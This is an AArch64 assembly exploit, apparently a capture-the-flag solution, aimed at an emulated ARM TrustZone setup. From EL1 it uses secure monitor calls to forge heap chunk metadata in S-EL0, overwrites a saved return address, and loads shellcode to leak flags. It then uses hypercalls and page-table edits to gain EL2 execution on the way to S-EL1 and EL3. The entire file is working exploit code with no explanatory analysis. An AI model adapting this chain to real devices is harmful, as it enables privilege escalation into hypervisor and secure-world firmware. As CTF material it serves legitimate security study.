.section .text
.global _start
_start:

    # NOTE: we're running in EL1, but attacking S-EL0

    # print el1 flag, just to sync with the python script
    ldr x0, =0xffffffffc0008408
    blr x0

    # Grab two random EL1 pages that are RW
    ldr x20, =0xffffffffc000D000
    ldr x21, =0xffffffffc000F000

    # Grab their physaddrs
    ldr x22, =0xD000
    ldr x23, =0xF000
    
    # Map the physaddr into S-EL0, as a fake buf of size 0x40000
    ldr x8, =0xffffffffc0009164
    ldr x0, =0x83000003
    mov x1, x22
    ldr x2, =0x41000
    mov x3, #0
    blr x8

    # save the handle
    mov x24, x0
    
    # We can now use the above mapping as a tcibuf to get a large S-EL0 malloc call
    ldr x3, =0x3
    str w3, [x20]
    ldr x3, =0x00
    str w3, [x20, #4]
    ldr x3, =0x3ffe1
    str w3, [x20, #8]

    # save the key, causing an mmap into S-EL0 
    ldr x0, =0x83000006
    mov x1, x24
    mov x2, 0
    mov x3, 0
    smc #0

    # unmap the beginning of this chunk in S-EL0
    # the allocator is deterministic, so we know we have addr 0x237d000
    ldr x0, =0x83000004
    ldr x1, =0x237d000
    mov x2, 0x1000
    mov x3, 0
    smc #0

    # map in the chunk again, this time as our second writeable mapping
    ldr x8, =0xffffffffc0009164
    ldr x0, =0x83000003
    mov x1, x23
    ldr x2, =0x1000
    mov x3, #0
    blr x8

    # fake the chunk header

    # prev_size
    mov x3, 0
    str w3, [x21] 

    # sz (mark prev_inuse, and not mmap'd)
    ldr x3, =0x101
    str w3, [x21, #0x4]

    # fake nextchunk size
    str w3, [x21, #0x104]
    # fake next-next chunk prev_inuse
    ldr x3, =0x100
    str w3, [x21, #0x204]

    # fake nextchunk freelist to clobber PC on the stack
    # saved pc on stack is at 0xffff54
    # shellcode will start at 0x237d120
    ldr x3, =0x237d121
    str w3, [x21, #0x108]
    ldr x3, =0xffff4c
    str w3, [x21, #0x10c]

    # jump over the clobbered instruction with the following stub:
    # ldr r0, =0x237c000
    # bx r0

    ldr w3, =0x47004800
    str w3, [x21, #0x120]
    ldr w3, =0x0237d301
    str w3, [x21, #0x124]
   
    #
    # Set up shellcode repl via our stager
    #

    # Read in our S-EL1 shellcode
    add x14, x21, #0x300
    add x15, x21, #0x1000

loop:
    ldr x8, =0xffffffffc0008fec

badchar:
    blr x8
    tbnz w0, #0x1f, badchar

    str x0, [x14]
    add x14, x14, 1
    cmp x14, x15
    bne loop

    # save a new key in slot 0, triggering sel0_free and our shellcode
    ldr x3, =0x3
    str w3, [x20]
    ldr x3, =0x00
    str w3, [x20, #4]
    ldr x3, =0x100
    str w3, [x20, #8]

    ldr x0, =0x83000006
    mov x1, x24
    mov x2, 0
    mov x3, 0
    smc #0
    # We can now execute off of our shellcode page by using load_key

    # Load shellcode to read the S-EL0 flag
    add x14, x21, #0x300
    add x15, x21, #0x1000

read_sc1:
    ldr x8, =0xffffffffc0008fec

badchar2:
    blr x8
    tbnz w0, #0x1f, badchar2

    str x0, [x14]
    add x14, x14, 1
    cmp x14, x15
    bne read_sc1

    # Execute load_key
    ldr x3, =0x2
    str w3, [x20]

    ldr x0, =0x83000006
    mov x1, x24
    mov x2, 0
    mov x3, 0
    smc #0

    # Print out the first 0x100 bytes of shellcode page, as output
    mov x14, x21
    add x15, x21, #0x100

output_flag:
    ldr x0, [x14]
    ldr x8, =0xffffffffc0008fe0
    blr x8

    add x14, x14, 1
    cmp x14, x15
    bne output_flag
    

    # Read in our EL3/S-EL1 shellcode
    add x14, x21, #0x300
    add x15, x21, #0x1000

loop_el3:
    ldr x8, =0xffffffffc0008fec

badchar_el3:
    blr x8
    tbnz w0, #0x1f, badchar_el3

    str x0, [x14]
    add x14, x14, 1
    cmp x14, x15
    bne loop_el3
    
    # set up the load_key to be made from EL2
    ldr x3, =0x2
    str w3, [x20]

    #
    # Now that we've leaked the S-EL1 flag, we set-up to exploit EL3 and S-EL2
    # First, we'll re-obtain execution in EL2's context
    # The code below is the exact same as used previously
    #

    # Perform a hypercall to turn 0xffffffffc0001000 PTE to point to 0x40101000
    ldr x0, =1
    ldr x1, =0x14c3
    ldr x2, =0x100000
    hvc #0

    # Mark the page as writeable in my own page table
    ldr x0, =0x0
    ldr x1, =0xffffffffc001b000
    ldr x2, =0xffffffffc0001000
    ldr x3, =0x40000000001433
    ldr x8, =0xffffffffc0008750
    blr x8
    
    # Read in our el2 shellcode
    ldr x14, =0xffffffffc0001000
    ldr x15, =0xffffffffc0001ff0

el2_loop:
    ldr x8, =0xffffffffc0009ad8
    blr x8
    str x0, [x14]
    add x14, x14, 1
    cmp x14, x15
    bne el2_loop

    # Make hypercall to jump to our shellcode
    # The rest of the exploit to leak S-EL1 and EL3 flags will
    # take place in EL2
    mov x0, x24
    hvc #0

lol:
    b lol
    nop
